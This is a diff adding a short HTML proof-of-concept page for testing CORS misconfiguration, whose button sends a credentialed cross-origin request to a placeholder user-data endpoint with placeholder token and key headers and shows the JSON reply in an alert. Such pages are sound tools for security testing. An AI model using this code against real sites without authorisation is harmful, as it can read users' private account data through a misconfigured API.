@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS PoC</title>
+    <script>
+        function testCORS() {
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        // The request has been completed successfully
+                        try {
+                            var jsonResponse = JSON.parse(xhr.responseText);
+                            console.log('JSON Response', jsonResponse);
+                            alert('Success! Response: ' + JSON.stringify(jsonResponse, null, 2));
+                        } catch (e) {
+                            alert('Failed to parse JSON response: ' + e.message);
+                        }
+                    } else {
+                        // There was a problem with the request
+                        alert('Request failed. Returned status of ' + xhr.status);
+                    }
+                }
+            };
+            xhr.open('GET', 'http://targetapp/api/v1/user', true); // Replace with the target endpoint
+            xhr.setRequestHeader('Accept', 'application/json'); // Expecting JSON data
+            // can include more headers here, if that request requires some necessary headers for the request to be successfull, for eg..
+            xhr.setRequestHeader('authtoken', 'your_auth_token_here'); // Set your authorization token here
+            xhr.setRequestHeader('apikey', 'your_api_key_here'); // Set your API key here
+            xhr.withCredentials = true; // Include credentials in the request
+            xhr.send();
+        }
+    </script>
+</head>
+<body>
+    <h1>CORS Misconfiguration Test Page</h1>
+    <button onclick="testCORS()">Test CORS</button>
+</body>
+</html>
